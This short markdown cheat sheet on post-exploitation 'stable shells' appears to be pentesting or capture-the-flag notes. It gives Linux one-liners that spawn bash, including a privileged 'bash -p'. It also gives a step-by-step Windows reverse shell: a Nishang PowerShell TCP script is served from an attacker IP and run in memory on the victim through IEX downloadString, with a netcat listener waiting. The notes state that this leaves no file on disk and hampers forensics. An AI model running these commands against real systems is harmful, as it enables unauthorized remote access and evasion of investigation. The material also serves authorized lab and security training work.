# Stable Shells (Post-Exploitation)

----------------------------------------------------
## Linux: 

### Python pty Shell
`python -c 'import pty;pty.spawn("/bin/bash")'`

### Perl system command one liner
`perl -e 'system("/bin/bash -p");'`



## Windows:

### Using Nishang

   * On Attacker's machine:
   1. Copy *nishang/Shells/Invoke-PowerShellTCP.ps1* to pwd and name it *nishang.ps1*
   2. Add line *Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.11 -Port 4444* to the end of the file.
   3. Use the command `python -m SimpleHTTPServer` to make start a server on pwd.
   4. Start a netcat listener `nc -lvp 4444` 

   * On Victim's machine:
   1. Use the command `powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.11:8000/nishang.ps1')` to 
   	  start a reverse shell on the machine.
   2. *downloadString* in the above command will not download the file, instead it will copy the contents of the file to the
      memory and executed directly from there. This leaves no trace of the file on the disk, and thus makes job of forensics 
      harder.

  